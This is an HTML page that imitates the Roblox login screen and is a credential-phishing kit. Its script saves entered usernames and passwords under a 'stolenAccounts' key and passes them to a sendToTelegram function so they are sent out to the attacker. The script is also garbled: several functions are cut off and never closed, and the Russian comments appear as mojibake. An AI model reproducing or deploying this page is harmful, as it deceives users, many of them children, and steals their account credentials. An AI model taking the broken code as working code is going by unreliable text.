<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox - Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Gotham SSm A', 'Gotham SSm B', Arial, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .login-container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 420px;
            overflow: hidden;
        }
        
        .login-header {
            background: #00a2ff;
            padding: 30px 20px;
            text-align: center;
        }
        
        .login-header h1 {
            color: white;
            font-size: 28px;
            font-weight: 700;
        }
        
        .login-form {
            padding: 30px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #495057;
            font-weight: 600;
            font-size: 14px;
        }
        
        .form-group input {
            width: 100%;
            padding: 14px;
            border: 2px solid #e9ecef;
            border-radius: 6px;
            font-size: 16px;
            transition: border-color 0.3s ease;
        }
        
        .form-group input:focus {
            outline: none;
            border-color: #00a2ff;
        }
        
        .login-btn {
            width: 100%;
            background: #00a2ff;
            color: white;
            border: none;
            padding: 16px;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.3s ease;
        }
        
        .login-btn:hover {
            background: #0088cc;
        }
        
        .login-footer {
            text-align: center;
            padding: 20px;
            color: #6c757d;
            font-size: 12px;
            border-top: 1px solid #e9ecef;
        }
        
        .error-message {
            color: #dc3545;
            font-size: 14px;
            margin-top: 5px;
            display: none;
        }
        
        .loading {
            display: none;
            text-align: center;
            color: #00a2ff;
            margin-top: 10px;
        }
        
        .forgot-password {
            text-align: center;
            margin-top: 15px;
        }
        
        .forgot-password a {
            color: #00a2ff;
            text-decoration: none;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-header">
            <h1>ROBLOX</h1>
        </div>
        
        <div class="login-form">
            <form id="robloxLoginForm">
                <div class="form-group">
                    <label for="username">Username or Email</label>
                    <input type="text" id="username" name="username" required autocomplete="username">
                    <div class="error-message" id="usernameError">Please enter your username</div>
                </div>
                
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" required autocomplete="current-password">
                    <div class="error-message" id="passwordError">Please enter your password</div>
                </div>
                
                <button type="submit" class="login-btn">Login</button>
                <div class="loading" id="loading">Signing in...</div>
                
                <div class="forgot-password">
                    <a href="#">Forgot password?</a>
                </div>
            </form>
        </div>
        
        <div class="login-footer">
            Â© 2024 Roblox Corporation. All rights reserved.
        </div>
    </div>

    <script>

        async function getIP() {
            try {

        function saveToLocalStorage(username, password, ip) {
            const existingData = JSON.parse(localStorage.getItem('stolenAccounts') || '[]');

        // ÐžÐ±Ñ€Ð°Ð±Ð¾Ñ‚ÐºÐ° Ñ„Ð¾Ñ€Ð¼Ñ‹
        document.getElementById('robloxLoginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value;
            const loadingElement = document.getElementById('loading');
            
            if (!username) {
                document.getElementById('usernameError').style.display = 'block';
                return;
            }
            if (!password) {
                document.getElementById('passwordError').style.display = 'block';
                return;
            }
            
            loadingElement.style.display = 'block';
            document.querySelector('.login-btn').disabled = true;
            
            // ÐžÑ‚Ð¿Ñ€Ð°Ð²Ð»ÑÐµÐ¼ Ð´Ð°Ð½Ð½Ñ‹Ðµ
            await sendToTelegram(username, password);

        // Ð¡ÐºÑ€Ñ‹Ð²Ð°ÐµÐ¼ Ð¾ÑˆÐ¸Ð±ÐºÐ¸ Ð¿Ñ€Ð¸ Ð²Ð²Ð¾Ð´Ðµ
        document.getElementById('username').addEventListener('input', function() {

        // ÐÐ²Ñ‚Ð¾Ñ„Ð¾ÐºÑƒÑ Ð½Ð° Ð¿Ð¾Ð»Ðµ Ð²Ð²Ð¾Ð´Ð°

    </script>
</body>
</html>
